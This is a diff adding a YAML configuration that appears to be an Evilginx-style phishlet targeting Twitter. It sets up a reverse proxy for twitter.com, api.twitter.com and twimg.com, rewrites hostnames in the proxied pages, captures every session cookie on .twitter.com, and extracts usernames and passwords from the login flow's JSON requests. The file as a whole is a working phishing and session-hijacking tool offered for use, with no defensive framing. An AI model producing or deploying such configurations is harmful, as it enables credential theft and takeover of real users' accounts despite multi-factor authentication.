@@ -1,0 +1,26 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'twitter.com', session: true, is_landing: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com'}
+  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com'}
+sub_filters:
+  - {triggers_on: 'twitter.com', orig_sub: '', domain: 'twitter.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'api.twitter.com', orig_sub: 'api', domain: 'twitter.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.twitter.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/i/api/1.1/onboarding/task.json'
+credentials:
+  username:
+    key: ''
+    search: '{"text_data":{"result":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+
+login:
+  domain: 'twitter.com'
+  path: '/i/flow/login'
